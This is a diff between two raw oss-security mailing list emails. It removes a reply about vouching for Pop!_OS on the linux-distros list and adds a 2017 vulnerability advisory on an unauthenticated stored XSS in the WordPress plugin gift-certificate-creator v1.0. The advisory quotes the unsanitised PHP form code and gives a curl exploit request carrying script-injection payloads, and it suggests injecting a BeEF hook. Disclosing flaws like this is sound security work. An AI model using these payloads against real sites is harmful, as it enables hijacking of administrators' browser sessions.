@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1329" "Friday" "30" "July" "2021" "14:23:58" "-0500" "Tyler Hicks" "code@tyhicks.com" nil "33" "Re: [oss-security] Pop!_OS Membership to linux-distros list" nil nil nil "7" nil nil (number mark "U       code@tyhicks Jul 30   33/1329  " thread-indent "\"Re: [oss-security] Pop!_OS Membership to linux-distros list\"\n") nil nil nil nil nil nil nil nil nil "Re: [oss-security] Pop!_OS Membership to linux-distros list" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["3692" "Friday" "2" "June" "2017" "13:45:49" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<1FF6A1D9-4F53-40F3-A9E5-0E7AA03F82A6@me.com>" "79" "[oss-security] Unauthenticated Stored XSS Vulnerability in Wordpress plugin gift-certificate-creator v1.0" "^Date:" nil nil "6" "2017060217:45:49" "[oss-security] Unauthenticated Stored XSS Vulnerability in Wordpress plugin gift-certificate-creator v1.0" (number mark "U       larry0@me.co Jun  2   79/3692  " thread-indent "\"[oss-security] Unauthenticated Stored XSS Vulnerability in Wordpress plugin gift-certificate-creator v1.0\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 10159 invoked by uid 550); 30 Jul 2021 20:33:25 -0000
+Received: (qmail 25623 invoked by uid 550); 2 Jun 2017 17:46:04 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,77 +11,110 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
+Received: (qmail 25605 invoked from network); 2 Jun 2017 17:46:03 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
+	t=1496425552; bh=Y5Z5oeqAMBuCkXQXqBVnZ41qy1+BTJQXDAACw07800M=;
+	h=From:Content-type:Subject:Message-id:Date:To:MIME-version;
+	b=RaDUi2R0pMhGI2Ju7kacbxUkP4uCzlPmimBo79Nwt0OA0kyYQZYQokQeS0bSfl4MY
+ /tJsnVJnd//vbpw4IBhh1kCL+hs10FSLMezARCvXRSuNI2H8ZEj3A8XBjb865BNoms
+ 8k+h9lBdTQgyXe/2zKnbUeZMJ9HIzwocQTHRot3HW+6o/Vv3iAc4WcxxdM1ToBsP+J
+ IiKl22EysFhontY615ils9YVOu6YSON4281lOtvcZkra69msOHKPEnccJdIlXEs03w
+ cp53gumfthax95fVWHrhoLSBIIRkrGFE5wsvReTlemt4+YbgRLWVEH0W6K/zy/YXYB
+ vHoMrLFrf2X8g==
+X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
+ definitions=2017-06-02_09:,, signatures=0
+X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
+ clxscore=1034 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
+ bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
+ engine=8.0.1-1701120000 definitions=main-1706020315
+Content-type: text/plain; charset=utf-8
+Content-transfer-encoding: quoted-printable
+Message-id: <1FF6A1D9-4F53-40F3-A9E5-0E7AA03F82A6@me.com>
+MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
+X-Mailer: Apple Mail (2.3124)
+Date: Fri, 02 Jun 2017 13:45:49 -0400
+From: "Larry W. Cashdollar" <larry0@me.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 13816 invoked from network); 30 Jul 2021 19:24:13 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=tyhicks-com.20150623.gappssmtp.com; s=20150623;
-        h=date:from:to:subject:message-id:references:mime-version
-         :content-disposition:in-reply-to;
-        bh=BkwsEVTP/Oh4jDh6GBaJvLpP35wO9COsu6AKTPAwHas=;
-        b=EmAUOdrMMkmwfeFP3TdCDOv7OhmTysA45G8QjF+gLN1ckh7WCLUozOrfHfJE7423Rg
-         7t0KnS3htK1j8r8V/FQe8q+Qla5DJPFSxseYp0iH0XreTT60cEBLjCy6XvKsYK37Ri4U
-         MT4rkVgVqkHI/g7jcGTEiPKCCD3HXH3YNP/AK7W+hHeZJayThw2oepIL9pgl7PBjaeQU
-         pRqUbFuy+SuCsobsKof8zRlCtRRlGe040cN+y8wnz4f0u9cG8rO6RHSHPHBIbKNpNDXY
-         ++OjiwU2JDqZ71/kDXkYJjw2oTDpuWz8OQG+H7LRTvIiNZpjGl2FQCt6qZfRdCBXcf2c
-         Uw/Q==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:date:from:to:subject:message-id:references
-         :mime-version:content-disposition:in-reply-to;
-        bh=BkwsEVTP/Oh4jDh6GBaJvLpP35wO9COsu6AKTPAwHas=;
-        b=Ea6KTv/M9CRkIGAoqVlX5qa5Lz2sJQpeVEi27oqUY9gLZvDNpF01dZr9GdwLHI4+Wk
-         wmlq6ZnLt+2Or7Cxx+c5yIpR4On3TO6jb0Vzq1peYl8bGB+/VYsbjbroM0EnCrDZQ5QS
-         mj8Yxx+XbNVo3MPGsXhk/vk/tiUoD6UfvdvL5/xFyhlE8v6PzH0F3DjlEMWV9cTEJKPZ
-         /h090Qjr9nNFZJnGKuxYac5/hv72aQyZfKpund3VV5+xOdDKsrWAIcCB+HpXJVXwwe6a
-         9Us1y8ll2Tk6qtD+ygd7kc2No1JXxzYqrUNfOe4xYztMITO25bbue1qwHwEoq64nWF1c
-         /fqQ==
-X-Gm-Message-State: AOAM5308+7uzN3rji2B+9jCvtByx62RGXM3vxGrzZC/HhJl5G9PLA9cn
-	bQs/bxUM0xkUpjCHCGLQdvYbACrgi84f4Agq
-X-Google-Smtp-Source: ABdhPJxHMdK/NsqMUaR7LDW2DmZbFHysp83b9o6cU/cT0itcNCHjABcdKiBFgmk2epYdJkq/WA3lqw==
-X-Received: by 2002:a05:6808:f14:: with SMTP id m20mr3079921oiw.179.1627673041039;
-        Fri, 30 Jul 2021 12:24:01 -0700 (PDT)
-Date: Fri, 30 Jul 2021 14:23:58 -0500
-From: Tyler Hicks <code@tyhicks.com>
-To: oss-security@lists.openwall.com
-Message-ID: <20210730192358.GB5486@sequoia>
-References: <cf53fe7b-371e-48dd-90d7-fa2719747d9d@www.fastmail.com>
- <20210727175924.GA16557@openwall.com>
-MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <20210727175924.GA16557@openwall.com>
-Subject: Re: [oss-security] Pop!_OS Membership to linux-distros list
+Subject: [oss-security] Unauthenticated Stored XSS Vulnerability in Wordpress plugin
+ gift-certificate-creator v1.0
+To: Open Source Security <oss-security@lists.openwall.com>
 
-On 2021-07-27 19:59:24, Solar Designer wrote:
-> Hi Jeremy,
-> 
-> On Tue, Jul 20, 2021 at 02:23:26PM -0600, Jeremy Soller wrote:
-> > 9. Have someone already on the private list, or at least someone else who has
-> > been active on oss-security for years but is not affiliated with your distro
-> > nor your organization, vouch for at least one of the people requesting
-> > membership on behalf of your distro (then that one vouched-for person will be
-> > able to vouch for others on your team, in case you'd like multiple people
-> > subscribed)
-> > 
-> > I do not know if I have contacts that are already on the linux-distros list.
-> 
-> It can also be "someone else who has been active on oss-security for
-> years but is not affiliated".  Anyone?
+Title: Unauthenticated Stored XSS Vulnerability in Wordpress plugin gift-ce=
+rtificate-creator v1.0
+Author: Larry W. Cashdollar, @_larry0
+Date: 2017-05-15
+CVE-ID:[CVE-2017-1002017]
+Download Site: https://wordpress.org/plugins/gift-certificate-creator/
+Vendor: Bob Cares https://bobcares.com/
+Vendor Notified: 2017-05-17
+Vendor Contact: plugins@wordpress.org
+Advisory: http://www.vapidlabs.com/advisory.php?v=3D191
+Description: Gift Certificate Creator WordPress plugin allows you to manage=
+ gift certificates on your website. In a convenient front-end UI provided b=
+y this plugin, your site visitors can enter the amount and user details. On=
+ form submission, the user details will be sent to the administrator. Also,=
+ the administrator can view the list of all the certificate requests.
+Vulnerability:
+Publically accessible pages that are using the shortcode =E2=80=98[gift_cer=
+tificate_form]=E2=80=99 allow any user to add gift certificate entries into=
+ the database.  These entries are listed by the Wordpress administrator whe=
+n visiting the plugin admin page.  This action is performed by gc-list.php =
+which doesn't sanitize the entries before
+displaying them.   This allows malicious javascript to be injected into the=
+ WordPress database.=20
 
-I recognize Jeremy's name and IRC nick (jackpot51) from a few
-discussions that we've had in the Ubuntu bug tracker and Ubuntu related
-IRC channels. Our interactions don't go very deep but they were security
-related. This was right around the time Pop!_OS would have been in
-initial development (2017, according to Wikipedia).
 
-I typically only "vouch" for people on linux-distros when I personally
-know and have worked closely with them. That's not the case with Jeremy
-but I do believe that he's in the correct line of work for membership
-purposes.
+In file giftcertificates.php=20
+141:    if ($_REQUEST['action'] =3D=3D 'Submit') {
+144:        //if (!empty($_REQUEST['cert_amount']) && !empty($_REQUEST['cc_=
+number']) && !empty($_REQUEST['cc_sec_code'])) {
+145:   		if (!empty($_REQUEST['cert_amount']) && !empty($_REQUEST['cc_sec_c=
+ode'])) {
+147:            $gcmObj->createNewGCM($_REQUEST);
+149:            writeLog(" amount ".$_REQUEST['cert_amount']." and email ".=
+$_REQUEST['cc_sec_code']." are posted successfully", basename(__LINE__), ba=
+sename(__FILE__));
+152:            $gcmObj->sendGCMReportEmail(GC_MAIL_TO, GC_MAIL_FROM, GC_MA=
+IL_SUBJECT, $_REQUEST);
+153:            $_REQUEST =3D array();
+212-    <form method=3D"get" name=3D"gc_form" action=3D"">
+213-        <table class=3D'gc_form'>
+214-            <tr>
+215-                <th>Certificate Amount:</th>
+216:                <td><input type=3D"text" name=3D"cert_amount" value=3D"=
+<?php echo $_REQUEST['cert_amount']; ?>" placeholder =3D"$"></td>
+217-            </tr>
+218-            <tr>
+219-                <th>Your Name:</th>
+220:                <td><input type=3D"text" name=3D"user_name" value=3D"<?=
+php echo $_REQUEST['user_name']; ?>"> (optional)</td>
+221-            </tr>
+222-            <tr>
+223-                <th>Recipient Name:</th>
+224:                <td><input type=3D"text" name=3D"receip_name" value=3D"=
+<?php echo $_REQUEST['receip_name']; ?>"> (optional)</td>
+225-            </tr>
+226-            <tr>
+227-                <th>Recipient Email:</th>
+228:                <td><input type=3D"text" name=3D"cc_sec_code" value=3D"=
+<?php echo $_REQUEST['cc_sec_code']; ?>"></td>
+229-            </tr>
+230-            <tr>
+231-                <th>Recipient Address:</th>
+232:                <td><textarea name=3D"receip_address" value=3D"<?php ec=
+ho $_REQUEST['receip_address']; ?>"></textarea>
+233-            </tr>
+234-            <tr>
+235-                <td colspan=3D"2" style=3D"text-align: center;"><input =
+type=3D"submit" value=3D"Submit" name=3D"action"></td>
+236-            </tr>
+237-        </table>
 
-Tyler
+Exploit Code:
+	=E2=80=A2 $ curl http://example/index.php/2017/05/16/gift-certificates/?ce=
+rt_amount=3D50&user_name=3D%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E=
+&receip_name=3D%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&cc_sec_code=
+=3Dno%40me.net&receip_address=3D%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscri=
+pt%3E&action=3DSubmit
 
-> 
-> Thanks,
-> 
-> Alexander
+Notes: Inject a BeEF hook even.=
